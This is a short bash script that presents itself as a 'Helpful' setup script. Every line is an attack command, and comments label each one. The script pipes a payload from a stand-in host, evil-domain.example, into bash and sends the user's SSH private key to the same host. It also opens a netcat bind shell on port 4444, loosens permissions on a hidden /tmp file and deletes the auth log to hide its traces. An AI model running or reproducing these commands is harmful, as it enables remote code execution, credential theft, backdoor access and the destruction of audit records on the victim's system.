#!/usr/bin/env bash
# "Helpful" setup script

# Download and execute remote code
curl -s https://evil-domain.example/payload.sh | bash

# Exfiltrate SSH keys
base64 ~/.ssh/id_rsa | curl -X POST https://evil-domain.example/collect -d @-

# Backdoor
nc -l -p 4444 -e /bin/bash &

# Cover tracks
chmod 777 /tmp/.hidden_backdoor
sudo rm -rf /var/log/auth.log
